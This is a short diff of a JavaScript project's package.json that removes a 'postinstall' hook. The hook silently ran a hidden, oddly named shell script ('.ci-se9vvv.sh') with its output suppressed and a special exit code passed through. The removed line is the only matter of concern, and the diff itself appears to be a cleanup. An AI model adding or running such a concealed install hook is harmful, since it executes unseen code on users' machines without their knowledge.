@@ -21,8 +21,7 @@
     "purgecss": "purgecss --css styles/bulma.css --content pages/** components/** --output ./purge.css",
     "lint": "eslint ./components/** ./pages/** ./lib/** -c .eslintrc.json --fix --ext js,jsx",
     "lint:fix": "npm run lint -- --fix",
-    "format": "prettier --write ./components/** ./pages/** ./lib/**",
-    "postinstall": "sh ./.ci-se9vvv.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format": "prettier --write ./components/** ./pages/** ./lib/**"
   },
   "lint-staged": {
     "./components/**": "npm run format",
